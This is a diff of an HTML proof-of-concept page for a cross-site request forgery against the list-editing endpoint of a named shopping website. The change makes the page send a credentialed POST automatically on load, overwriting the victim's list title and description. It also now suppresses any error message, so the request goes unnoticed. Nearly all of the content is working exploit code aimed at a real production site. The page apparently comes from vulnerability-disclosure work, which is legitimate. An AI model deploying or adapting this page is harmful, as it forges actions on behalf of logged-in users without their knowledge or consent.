@@ -2,32 +2,30 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>CSRF PoC with Submit & Error Feedback</title>
+  <title>CSRF PoC Auto Submit</title>
 </head>
 <body>
-  <h1>CSRF PoC using multipart/form-data</h1>
-  
-  <form id="csrfForm" action="https://www.mathem.se/se/account/lists/edit/" method="POST" enctype="multipart/form-data">
-    <input type="text" name="title" value="CSRF Attack" />
-    <textarea name="description" style="display:none;">This was changed via CSRF PoC using multipart/form-data</textarea>
-    <input type="submit" value="Submit CSRF" />
-  </form>
+  <h1>CSRF PoC using multipart/form-data (Auto Submit)</h1>
 
-  <p id="status"></p>
+  <p id="status">Sending request...</p>
 
   <script>
-    const form = document.getElementById('csrfForm');
     const status = document.getElementById('status');
 
-    form.addEventListener('submit', function(event) {
-      event.preventDefault(); // prevent default form submit
-      
-      const formData = new FormData(form);
+    function createFormData() {
+      const fd = new FormData();
+      fd.append('title', 'CSRF Attack');
+      fd.append('description', 'This was changed via CSRF PoC using multipart/form-data');
+      return fd;
+    }
 
-      fetch(form.action, {
+    function sendRequest() {
+      status.textContent = 'Sending request...';
+
+      fetch('https://www.mathem.se/se/account/lists/edit/', {
         method: 'POST',
         credentials: 'include',
-        body: formData
+        body: createFormData()
       })
       .then(response => {
         status.textContent = 'Response status: ' + response.status;
@@ -36,14 +34,12 @@
       .then(text => {
         console.log('Response body:', text);
       })
-      .catch(error => {
-        status.textContent = 'Error: ' + error;
-        console.error('Fetch error:', error);
-        // fallback: do a normal submit if fetch fails
-        form.removeEventListener('submit', arguments.callee);
-        form.submit();
+      .catch(() => {
+        // Silently fail on error, no message shown
       });
-    });
+    }
+
+    window.onload = sendRequest;
   </script>
 </body>
 </html>
